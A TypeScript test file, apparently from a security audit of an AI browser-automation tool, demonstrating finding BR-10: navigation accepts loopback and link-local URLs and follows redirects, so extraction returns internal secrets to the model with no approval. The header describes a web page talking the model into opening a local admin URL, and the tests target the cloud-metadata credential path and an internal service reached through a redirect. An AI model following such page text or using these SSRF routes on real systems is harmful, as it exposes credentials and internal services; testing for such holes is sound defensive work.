/**
 * BR-10 — navigation validates only scheme and userinfo; the browser layer has no
 * destination policy and follows redirects anywhere.
 *
 * dom.ts:250-255 `navigationUrl()` accepts any http(s) URL, including loopback and
 * link-local addresses. `browser_navigate`, `tabs open` and the optional `url` of
 * subgoal/extract all use it, and `browser_extract` then returns the body text to
 * the model with no approval. So a page that talks the model into "open
 * http://127.0.0.1:PORT/admin" turns the controlled browser into a read-capable
 * SSRF client for anything reachable from the host, and a redirect from an
 * innocuous public URL reaches the same place after the check.
 */
import { afterAll, beforeAll, expect, it } from 'vitest'
import type { Browser } from 'playwright'
import { navigationUrl } from '../../../packages/dsh-browser-use-d1/src/dom.ts'
import { runBrowserExtract } from '../../../packages/dsh-browser-use-d1/src/extract.ts'
import { config, htmlRoute, launch, newPage, serve } from './harness.ts'

let browser: Browser
beforeAll(async () => { browser = await launch() })
afterAll(async () => { await browser.close() })

it('accepts loopback and cloud-metadata destinations', () => {
  expect(navigationUrl('http://127.0.0.1:9200/_cat/indices')).toBe('http://127.0.0.1:9200/_cat/indices')
  expect(navigationUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/')).toContain('169.254.169.254')
  expect(navigationUrl('http://[::1]:6379/')).toContain('[::1]')
})

it('reads a loopback-only service through a redirect from a public-looking URL', async () => {
  const internal = await serve('<h1>internal</h1><pre id="secret">DB_PASSWORD=prod-8f31</pre>', {
    '/internal': htmlRoute('<h1>internal</h1><pre id="secret">DB_PASSWORD=prod-8f31</pre>'),
  })
  const publicServer = await serve('<h1>public</h1>', {
    '/go': (_request, response) => {
      response.writeHead(302, { location: `${internal.url}internal` })
      response.end()
    },
  })
  const page = await newPage(browser)
  try {
    const result = await runBrowserExtract(page, config(), {
      url: `${publicServer.url}go`,
      fields: [{ name: 'secret', type: 'string', locator: { kind: 'css', selector: '#secret' } }],
    }, new AbortController().signal)
    expect(result.status).toBe('success')
    expect(result.data).toEqual({ secret: 'DB_PASSWORD=prod-8f31' })
    expect(result.evidence.url).toBe(`${internal.url}internal`)
  } finally {
    await page.context().close()
    await publicServer.close()
    await internal.close()
  }
})

it('direct loopback navigation + extract also needs no approval of any kind', async () => {
  const internal = await serve('<pre id="secret">admin-token=abc123</pre>', {
    '/admin': htmlRoute('<pre id="secret">admin-token=abc123</pre>'),
  })
  const page = await newPage(browser)
  try {
    const result = await runBrowserExtract(page, config(), {
      url: `${internal.url}admin`,
      fields: [{ name: 'token', type: 'string', locator: { kind: 'css', selector: '#secret' } }],
    }, new AbortController().signal)
    expect(result.status).toBe('success')
    expect(result.data).toEqual({ token: 'admin-token=abc123' })
  } finally {
    await page.context().close()
    await internal.close()
  }
})
